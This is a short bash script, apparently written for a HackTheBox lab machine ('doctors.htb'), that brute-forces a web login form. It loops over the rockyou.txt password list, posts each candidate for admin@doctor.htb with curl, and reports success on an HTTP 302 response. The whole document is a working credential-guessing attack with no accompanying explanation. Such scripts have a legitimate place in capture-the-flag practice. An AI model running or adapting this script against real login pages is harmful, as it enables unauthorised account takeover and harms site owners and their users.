#!/bin/bash

url="http://doctors.htb/login"

for i in `cat /usr/share/wordlists/rockyou.txt`; do
	status=`curl -X POST -d "email=admin@doctor.htb&password=$i&submit=Login" $url -i -s | head -n 1 | cut -d " " -f 2`
	if [ $status -eq 302 ]; then
		echo "Valid creds found!: $i";
		break;
	fi
	printf "trying $i\n"
done	

